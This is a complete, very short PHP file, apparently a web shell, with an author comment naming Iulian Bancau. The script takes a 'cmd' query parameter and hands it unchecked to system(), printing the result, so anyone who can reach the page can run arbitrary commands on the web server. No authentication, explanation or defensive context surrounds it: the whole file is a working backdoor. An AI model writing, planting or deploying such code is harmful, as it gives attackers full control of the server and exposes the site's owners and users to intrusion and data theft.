<?php

////Author: Iulian Bancau

$command = $_GET['cmd'];

$output = system($command);

echo $output;

?>
